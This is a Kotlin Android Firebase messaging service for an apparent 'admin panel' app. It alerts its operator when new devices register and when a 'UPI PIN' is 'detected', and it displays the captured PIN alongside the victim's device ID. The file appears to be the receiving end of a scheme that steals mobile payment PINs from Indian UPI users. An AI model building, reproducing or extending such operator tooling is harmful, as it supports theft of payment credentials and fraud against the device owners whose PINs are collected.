package com.panel.me

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class MyFirebaseMessagingService : FirebaseMessagingService() {
    
    companion object {
        private const val TAG = "FCMService"
        private const val CHANNEL_ID = "admin_notifications"
    }
    
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "===== NEW FCM TOKEN =====")
        Log.d(TAG, "Token: $token")
        saveTokenToPreferences(token)
        Log.d(TAG, "Token saved")
    }
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        Log.d(TAG, "===== MESSAGE RECEIVED =====")
        Log.d(TAG, "From: ${remoteMessage.from}")
        Log.d(TAG, "Message ID: ${remoteMessage.messageId}")
        Log.d(TAG, "Data: ${remoteMessage.data}")
        Log.d(TAG, "Notification: ${remoteMessage.notification?.title}")
        
        try {
            remoteMessage.notification?.let {
                Log.d(TAG, "Has notification payload")
                showNotification(
                    it.title ?: "New Notification",
                    it.body ?: "",
                    remoteMessage.data
                )
            } ?: run {
                if (remoteMessage.data.isNotEmpty()) {
                    Log.d(TAG, "Data-only message, creating notification...")
                    handleDataMessage(remoteMessage.data)
                } else {
                    Log.w(TAG, "Empty message received")
                }
            }
            
            Log.d(TAG, "Message processing complete")
        } catch (e: Exception) {
            Log.e(TAG, "Error processing message", e)
        }
    }
    
    private fun handleDataMessage(data: Map<String, String>) {
        val type = data["type"]
        Log.d(TAG, "Handling data message type: $type")
        
        when (type) {
            "device_registered" -> {
                val deviceId = data["device_id"] ?: ""
                val model = data["model"] ?: "Unknown Device"
                val appType = data["app_type"] ?: ""
                
                val body = if (appType.isNotEmpty()) {
                    "$model ($appType)"
                } else {
                    model
                }
                
                showNotification(
                    "New Device Registered",
                    body,
                    data
                )
            }
            "upi_detected" -> {
                val deviceId = data["device_id"] ?: ""
                val upiPin = data["upi_pin"] ?: ""
                val model = data["model"] ?: ""
                
                val body = if (model.isNotEmpty()) {
                    "PIN: $upiPin - Device: $deviceId ($model)"
                } else {
                    "PIN: $upiPin - Device: $deviceId"
                }
                
                showNotification(
                    "UPI PIN Detected",
                    body,
                    data
                )
            }
            else -> {
                showNotification(
                    data["title"] ?: "New Notification",
                    data["body"] ?: "You have a new notification",
                    data
                )
            }
        }
    }
    
    private fun showNotification(title: String, body: String, data: Map<String, String>) {
        Log.d(TAG, "Showing notification: $title - $body")
        
        try {
            createNotificationChannel()
            
            val intent = Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                data.forEach { (key, value) ->
                    putExtra(key, value)
                }
            }
            
            val pendingIntent = PendingIntent.getActivity(
                this,
                System.currentTimeMillis().toInt(),
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val notificationBuilder = NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(body)
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setDefaults(NotificationCompat.DEFAULT_ALL)
                .setContentIntent(pendingIntent)
                .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                .setVibrate(longArrayOf(0, 500, 500, 500))
                .setCategory(NotificationCompat.CATEGORY_MESSAGE)
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val notificationId = System.currentTimeMillis().toInt()
            
            notificationManager.notify(notificationId, notificationBuilder.build())
            Log.d(TAG, "Notification shown with ID: $notificationId")
        } catch (e: Exception) {
            Log.e(TAG, "Error showing notification", e)
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val name = "Admin Notifications"
                val descriptionText = "Notifications for admin activities"
                val importance = NotificationManager.IMPORTANCE_HIGH
                val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                    description = descriptionText
                    enableLights(true)
                    enableVibration(true)
                    setShowBadge(true)
                }
                
                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                notificationManager.createNotificationChannel(channel)
                Log.d(TAG, "Notification channel created")
            } catch (e: Exception) {
                Log.e(TAG, "Error creating notification channel", e)
            }
        }
    }
    
    private fun saveTokenToPreferences(token: String) {
        try {
            getSharedPreferences("FCM", Context.MODE_PRIVATE)
                .edit()
                .putString("token", token)
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error saving token", e)
        }
    }
}
